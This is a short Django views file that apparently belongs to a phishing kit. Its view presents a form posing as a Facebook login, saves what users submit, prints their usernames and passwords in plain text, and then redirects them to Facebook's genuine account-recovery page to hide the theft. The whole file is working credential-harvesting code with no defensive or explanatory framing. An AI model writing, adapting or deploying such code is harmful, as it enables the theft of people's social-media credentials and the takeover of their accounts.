from django.shortcuts import render
from facebook.forms import FacebookForm
from django.http import HttpResponseRedirect


# Create your views here.
def facebook_login(request):
    if(request.method == "POST"):
        fm = FacebookForm(request.POST)
        if fm.is_valid():
            fm.save()
            print(f"Username : {fm.cleaned_data.get("username")}")
            print(f"Password : {fm.cleaned_data.get("password")}\n")
            return HttpResponseRedirect("https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0")
    fm = FacebookForm()
    return render(request,"facebook/index.html",{"form":fm})